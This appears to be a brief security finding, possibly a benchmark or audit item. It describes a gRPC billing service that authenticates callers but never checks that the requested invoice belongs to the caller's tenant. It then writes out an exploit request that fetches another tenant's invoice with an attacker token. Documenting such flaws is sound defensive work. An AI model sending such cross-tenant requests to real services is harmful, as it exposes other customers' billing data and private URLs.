diagnosis: The gRPC servicer validates caller credentials from the incoming RPC metadata, but looks up the requested invoice solely by request.invoice_id without verifying invoice.tenant_id == caller.tenant_id. Any authenticated gRPC client can fetch billing amounts and private invoice URLs belonging to other tenants.
exploit_request:
POST /billing.BillingService/GetBillingInvoice HTTP/2.0
Host: grpc.example.com
Content-Type: application/grpc
TE: trailers
authorization: Bearer <attacker_token>

[gRPC binary payload: invoice_id: 88412]
